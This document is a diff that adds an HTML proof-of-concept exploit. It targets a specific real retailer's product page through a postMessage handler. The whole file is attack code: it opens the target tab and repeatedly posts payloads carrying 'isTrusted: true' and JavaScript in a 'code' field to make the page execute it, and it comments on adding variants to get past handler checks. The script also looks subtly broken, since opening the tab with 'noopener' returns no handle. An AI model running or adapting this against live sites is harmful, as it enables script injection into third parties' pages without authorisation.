@@ -1,0 +1,34 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>postMessage PoC</title>
+<body>
+<button id="go">Open target & send payload</button>
+<script>
+const TARGET = "https://www.weber.com/US/en/smoquepelletgrill.html";  // change if needed
+const DURATION_MS = 15000;   // how long to retry sending
+const INTERVAL_MS = 400;     // how often to send
+
+// Candidate payloads (tweak/add if handler checks 'type' or similar)
+const payloads = [
+  { isTrusted: true, code: "alert('pwned: ' + document.domain)" },        // raw object
+  JSON.stringify({ isTrusted: true, code: "alert('pwned JSON: ' + document.domain)" }) // stringified
+  // Add variants if you see extra checks in code, e.g.:
+  // { isTrusted: true, type: "exec", code: "alert('exec')" }
+];
+
+document.getElementById('go').onclick = () => {
+  const w = window.open(TARGET, "_blank", "noopener");   // tab handle for postMessage
+  if (!w) { alert("Popup blocked. Allow popups for this site."); return; }
+
+  const t0 = Date.now();
+  const timer = setInterval(() => {
+    // Stop after duration
+    if (Date.now() - t0 > DURATION_MS) { clearInterval(timer); return; }
+    // Fire each payload once per tick
+    for (const p of payloads) {
+      try { w.postMessage(p, "*"); } catch (e) { /* ignore */ }
+    }
+  }, INTERVAL_MS);
+};
+</script>
+</body>
